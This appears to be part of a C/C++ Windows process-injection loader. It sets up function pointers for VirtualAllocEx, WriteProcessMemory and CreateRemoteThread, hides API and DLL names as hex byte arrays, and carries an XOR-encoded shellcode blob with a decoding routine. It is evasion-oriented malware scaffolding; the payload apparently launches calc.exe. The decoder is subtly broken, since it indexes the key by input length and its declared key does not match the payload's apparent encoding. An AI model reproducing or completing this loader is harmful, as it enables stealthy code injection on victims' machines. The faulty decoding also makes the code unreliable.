/*


*/

typedef LPVOID(WINAPI* VirtualAllocEx_t)(
	HANDLE hProcess,
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD flAllocationType,
	DWORD flProtect
	);
VirtualAllocEx_t pVirtualAllocEx;

typedef BOOL(WINAPI* WriteProcessMemory_t)(
	HANDLE hProcess,
	LPVOID lpBaseAddress,
	LPCVOID lpBuffer,
	SIZE_T nSize,
	SIZE_T* lpNumberOfBytesWritten
	);
WriteProcessMemory_t pWriteProcessMemory;

typedef HANDLE(WINAPI* CreateRemoteThread_t)(
	HANDLE hProcess,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	SIZE_T dwStackSize,
	LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID lpParameter,
	DWORD dwCreationFlags,
	LPDWORD lpThreadId
	);
CreateRemoteThread_t pCreateRemoteThread;

const unsigned char key[] = { 0x58,0x6f,0x72,0x4b,0x65,0x79 };
const unsigned char payload[] =
	"\xf2\x46\x8d\xea\xfe\xe6\xce\x0e\x0e\x0e\x4f\x5f\x4f\x5e"
	"\x5c\x5f\x58\x46\x3f\xdc\x6b\x46\x85\x5c\x6e\x46\x85\x5c"
	"\x16\x46\x85\x5c\x2e\x46\x85\x7c\x5e\x46\x01\xb9\x44\x44"
	"\x43\x3f\xc7\x46\x3f\xce\xa2\x32\x6f\x72\x0c\x22\x2e\x4f"
	"\xcf\xc7\x03\x4f\x0f\xcf\xec\xe3\x5c\x4f\x5f\x46\x85\x5c"
	"\x2e\x85\x4c\x32\x46\x0f\xde\x85\x8e\x86\x0e\x0e\x0e\x46"
	"\x8b\xce\x7a\x69\x46\x0f\xde\x5e\x85\x46\x16\x4a\x85\x4e"
	"\x2e\x47\x0f\xde\xed\x58\x46\xf1\xc7\x4f\x85\x3a\x86\x46"
	"\x0f\xd8\x43\x3f\xc7\x46\x3f\xce\xa2\x4f\xcf\xc7\x03\x4f"
	"\x0f\xcf\x36\xee\x7b\xff\x42\x0d\x42\x2a\x06\x4b\x37\xdf"
	"\x7b\xd6\x56\x4a\x85\x4e\x2a\x47\x0f\xde\x68\x4f\x85\x02"
	"\x46\x4a\x85\x4e\x12\x47\x0f\xde\x4f\x85\x0a\x86\x46\x0f"
	"\xde\x4f\x56\x4f\x56\x50\x57\x54\x4f\x56\x4f\x57\x4f\x54"
	"\x46\x8d\xe2\x2e\x4f\x5c\xf1\xee\x56\x4f\x57\x54\x46\x85"
	"\x1c\xe7\x59\xf1\xf1\xf1\x53\x46\xb4\x0f\x0e\x0e\x0e\x0e"
	"\x0e\x0e\x0e\x46\x83\x83\x0f\x0f\x0e\x0e\x4f\xb4\x3f\x85"
	"\x61\x89\xf1\xdb\xb5\xfe\xbb\xac\x58\x4f\xb4\xa8\x9b\xb3"
	"\x93\xf1\xdb\x46\x8d\xca\x26\x32\x08\x72\x04\x8e\xf5\xee"
	"\x7b\x0b\xb5\x49\x1d\x7c\x61\x64\x0e\x57\x4f\x87\xd4\xf1"
	"\xdb\x6d\x6f\x62\x6d\x20\x6b\x76\x6b\x0e";

const int keyLen = sizeof(key);
const int payloadLen = sizeof(payload);

unsigned char *XorCipher(const unsigned char *input, int inputLen, const unsigned char key[], int keyLen) {

	u_char* output = new u_char[inputLen];
	for (int i = 0; i < inputLen - 1; i++) {
		output[i] = input[i] ^ key[i % inputLen];
	}
	return output;
}

unsigned char sKernel32[] = { 0x6b,0x65,0x72,0x6e,0x65,0x6c,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00 };
unsigned char sNtdll[] = { 0x6e,0x74,0x64,0x6c,0x6c,0x2e,0x64,0x6c,0x6c };
unsigned char sVirtualAllocEx[] = { 0x56,0x69,0x72,0x74,0x75,0x61,0x6c,0x41,0x6c,0x6c,0x6f,0x63,0x45,0x78,0x00 };
unsigned char sWriteProcessMemory[] = { 0x57,0x72,0x69,0x74,0x65,0x50,0x72,0x6f,0x63,0x65,0x73,0x73,0x4d,0x65,0x6d,0x6f,0x72,0x79,0x00 };
unsigned char sCreateRemoteThread[] = { 0x43,0x72,0x65,0x61,0x74,0x65,0x52,0x65,0x6d,0x6f,0x74,0x65,0x54,0x68,0x72,0x65,0x61,0x64,0x00 };

int sVirtualAllocExSize = sizeof(sVirtualAllocEx);
int sWriteProcessMemorySize = sizeof(sWriteProcessMemory);
int sCreateRemoteThreadSize = sizeof(sCreateRemoteThread);

/*


*/